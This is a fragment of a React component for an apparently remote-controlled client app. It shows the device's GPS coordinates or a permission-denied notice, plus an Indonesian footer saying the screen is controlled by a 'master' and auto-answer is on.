            </span>
          </div>
          {gpsState.lat !== null && gpsState.lng !== null ? (
            <div className="grid grid-cols-2 gap-2 pt-1 text-neutral-300">
              <div>LAT: {gpsState.lat.toFixed(6)}°</div>
              <div>LNG: {gpsState.lng.toFixed(6)}°</div>
              <div>ALT: {gpsState.alt !== null ? `${gpsState.alt}m` : 'N/A'}</div>
              <div>
                PREC: {gpsState.accuracy !== null ? `±${gpsState.accuracy}m` : 'N/A'}
              </div>
            </div>
          ) : (
            <div className="pt-1 text-amber-400/90 text-[11px]">
              {gpsState.status === 'PERMISSION_DENIED'
                ? 'Izin GPS ditolak oleh perangkat/browser. Koordinat tidak dikirim.'
                : 'Mencari sinyal satelit GPS perangkat...'}
            </div>
          )}
        </div>
      </div>

      {/* Bottom Power Notice */}
      <div className="border-t border-neutral-900 pt-3 flex items-center justify-between text-[11px] text-neutral-600">
        <div className="flex items-center gap-1.5">
          <ShieldAlert className="w-3.5 h-3.5 text-neutral-600" />
          <span>SAAT KONEK: LAYAR 100% PASIF &amp; DIKENDALIKAN OLEH MASTER</span>
        </div>
        <span>AUTO-ANSWER: ENABLED</span>
      </div>
    </div>
  );
};

export default Client;
